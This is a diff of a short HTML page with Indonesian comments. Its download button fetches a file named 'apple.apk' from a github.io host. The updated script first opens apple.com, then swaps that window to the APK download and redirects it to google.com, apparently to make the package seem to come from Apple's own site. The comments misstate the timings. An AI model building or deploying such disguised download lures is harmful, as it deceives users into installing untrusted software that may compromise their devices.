@@ -1,44 +1,46 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="utf-8">
+    <title>Redirect Bertahap</title>
+    <style>
+        .button {
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            background-color: #4CAF50;
+        }
+    </style>
 </head>
 <body>
 
 <script>
 function a() {
+    // buka apple.com
+    let win = window.open('https://apple.com', 'x');
 
-  // Trigger download terlebih dahulu
-  var link = document.createElement('a');
-  link.href = 'https://ecdnts-del.github.io/test-apk/apple.apk';
-  link.download = 'apple.apk';
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
+    // 5 detik ke google.com
+    setTimeout(function () {
+        win.location.href = 'https://ecdnts-del.github.io/test-apk/apple.apk';
 
-  // Redirect setelah download mulai (delay kecil)
-  setTimeout(function () {
-    window.location.href = "https://google.com";
-  }, 3500); // 0.8 detik
+        // 5 detik lagi ke example.com
+        setTimeout(function () {
+            win.location.href = 'https://google.com';
+        }, 900);
+
+    }, 1);
 }
 </script>
 
 <center>
-  <input type="button" class="button" value="Download From Original Site" onclick="a()">
+    <input type="button" class="button" value="DOWNLOAD" onclick="a()">
 </center>
 
 </body>
 </html>
-
